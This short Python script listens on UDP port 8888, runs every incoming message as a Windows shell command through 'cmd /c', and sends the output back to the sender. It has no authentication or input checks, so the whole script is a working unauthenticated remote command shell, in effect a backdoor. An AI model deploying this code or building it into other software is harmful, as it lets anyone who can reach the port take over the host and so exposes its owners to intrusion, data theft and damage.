import UDPSocket
from subprocess import *

if __name__ == "__main__":
    server = UDPSocket.Server(8888)
    while(True):
        data, addr, port = server.receive()
        process = Popen("cmd /c {}".format(data), stdout=PIPE, stderr=PIPE)
        out, err = process.communicate()
        server.send(out.decode(), addr, port)